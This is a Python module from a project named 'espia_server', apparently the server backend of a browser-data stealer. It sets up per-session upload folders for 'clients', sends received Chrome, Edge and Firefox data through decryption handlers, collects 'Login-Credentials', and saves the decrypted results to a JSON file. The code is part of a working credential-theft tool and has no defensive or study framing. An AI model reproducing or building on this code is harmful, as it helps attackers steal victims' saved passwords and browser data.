import configparser
import json
import os
import pathlib

from espia_server.app.plugins.chromium.chromium_handler import handle_all_chromium_modules
from espia_server.app.plugins.firefox.firefox_handler import handle_all_firefox_modules

_FINAL_PRODUCT_STRUCT = {
    "Chrome": {},
    "Edge": {},
    "Firefox": {},
    "Login-Credentials": {}
}

# Declaration of important objects
static_files_path = f'{pathlib.Path(__file__).parent.parent}/static_files'
uploads_path = pathlib.Path(pathlib.Path(os.path.realpath(__file__)).parent.parent / 'uploads')
_FULL_CONFIG_PATH = pathlib.Path(os.path.dirname(__file__)).joinpath('../../configs', 'config.ini')
config = configparser.ConfigParser()
config.read(pathlib.Path(_FULL_CONFIG_PATH).absolute())


def handle_new_uploaded_file(session_id, file_name: str) -> pathlib.Path:
    """
    Returns the specified new path for an uploaded file

    :param file_name: string file name
    :param session_id: Current product session id
    :return: pathlib object  to full upload path
    """
    file_path = uploads_path / session_id / file_name
    file_path.parent.mkdir(exist_ok=True, parents=True)
    return file_path


def create_new_client_dir(session_id: str) -> None:
    # Validate dir for new client
    (uploads_path / session_id).mkdir(exist_ok=True, parents=True)


def handle_products_results(session_id: str, results: dict) -> None:
    """
    Handles retrieved data

    :param session_id: Session id of current user
    :param results: dict of retrieved product
    """
    final_product = _FINAL_PRODUCT_STRUCT
    final_product["Chrome"] = handle_all_chromium_modules(results, "Chrome")
    final_product["Edge"] = handle_all_chromium_modules(results, "Edge")
    final_product["Firefox"] = handle_all_firefox_modules(uploads_path / session_id, results)
    final_product["Login-Credentials"] = results.get("Login-Credentials")
    write_final_product_to_file(session_id, final_product)


def write_final_product_to_file(session_id: str, final_product: dict) -> None:
    """
    Writes all decrypted data retrieved from client to a file in session directory

    :param session_id: client session id
    :param final_product: json object of the final decrypted results
    """
    with open(uploads_path / session_id / 'final_results.json', 'w') as file:
        json.dump(final_product, file, indent=4, sort_keys=True)
